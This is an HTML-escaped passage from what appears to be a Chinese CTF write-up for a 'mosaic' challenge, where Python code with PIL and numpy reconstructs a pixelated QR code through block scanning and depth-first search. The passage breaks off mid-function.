&lt;h2 id=&#34;马赛克&#34;&gt;&lt;a href=&#34;#马赛克&#34; class=&#34;headerlink&#34; title=&#34;马赛克&#34;&gt;&lt;/a&gt;马赛克&lt;/h2&gt;&lt;p&gt;模拟题。大概思路是先扫一遍，把能确定的先确定下来。之后再dfs剩下的块（不需要全部求出，毕竟这题的二维码纠错拉满了）。&lt;br&gt;代码很丑对吧QAQ（当时不熟悉ndarray操作，全部当做list做一遍）  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; math&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# import scipy&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; matplotlib.pyplot &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SIZE = &lt;span class=&#34;number&#34;&gt;627&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MSBLOCK = &lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;QRBLOCK = &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X, Y = &lt;span class=&#34;number&#34;&gt;103&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;137&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ImageToMatrix&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 读取图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    im = Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 显示图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     im.show()  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    width,height = im.size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    im = im.convert(&lt;span class=&#34;string&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = im.getdata()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = np.matrix(data,dtype=&lt;span class=&#34;string&#34;&gt;&amp;#x27;float&amp;#x27;&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;255.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_data = np.reshape(data,(width,height))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; new_data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     new_im = Image.fromarray(new_data)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     # 显示图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     new_im.show()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;MatrixToImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = data*&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_im = Image.fromarray(data.astype(np.uint8))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; new_im&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pre_arr =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res_arr =  [[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kimeta =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;span class=&#34;comment&#34;&gt;#钦定了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EACH = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(math.ceil(MSBLOCK/QRBLOCK)) &lt;span class=&#34;comment&#34;&gt;#EACH=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filename = &lt;span class=&#34;string&#34;&gt;&amp;#x27;pixelated_qrcode.bmp&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = ImageToMatrix(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;np.set_printoptions(threshold=&lt;span class=&#34;number&#34;&gt;1145141919810&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pre_arr[i][j]=data[i].tolist()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][j]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%QRBLOCK==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; j%QRBLOCK==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res_arr[i//QRBLOCK][j//QRBLOCK]=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data.tolist()[i][j])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# print(pre_arr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt;  &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j,now&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i&amp;gt;=&lt;span class=&#34;number&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;lt;=&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;gt;=&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; (pre_arr[i*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;][j*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] == now):&lt;span class=&#34;comment&#34;&gt;#随便写的offset&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (kimeta[i][j] &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; vis[i][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; res_arr[i][j]!=now:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getRange&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; i*QRBLOCK,j*QRBLOCK,(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*QRBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,(j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*QRBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;#x1,y1,x2,y2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vis =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calcDelta&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;Mi,Mj,fillN,comp,LUR,LUC&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fn = fillN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; xx &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; yy &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; 